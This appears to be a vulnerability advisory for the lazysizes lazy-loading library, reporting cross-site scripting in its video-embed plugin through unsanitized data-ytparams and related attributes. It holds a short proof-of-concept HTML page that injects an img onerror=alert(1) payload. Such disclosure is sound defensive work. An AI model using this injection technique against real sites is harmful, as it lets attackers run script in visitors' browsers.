# Overview

`org.webjars.bowergithub.afarkas:lazysizes` is a fast (jank-free), SEO-friendly and self-initializing lazyloader for images (including responsive images picture/srcset), iframes, scripts/widgets and much more. It also prioritizes resources by differentiating between crucial in view and near view elements to make perceived performance even faster.

This package is vulnerable to Cross-site Scripting (XSS) due to unsafe usage of `innerHTML`. The following attributes are not sanitized by the video-embed plugin: `data-vimeo`, `data-vimeoparams`, `data-youtube` and `data-ytparams` which can be abused to inject malicious JavaScript.

# Proof of Concept

```
<html>
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/plugins/video-embed/ls.video-embed.min.js"></script>
</head>
<body>
    <div class="ratio-16-9 lazyload%22 data-youtube="M7lc1UVf-VE%22 data-ytparams="&quot;&gt;&lt;/iframe&gt;&lt;img src=x onerror=alert(1%29&gt;">
        <button class="play-btn">play</button>
    </div>
</body>
</html>
```
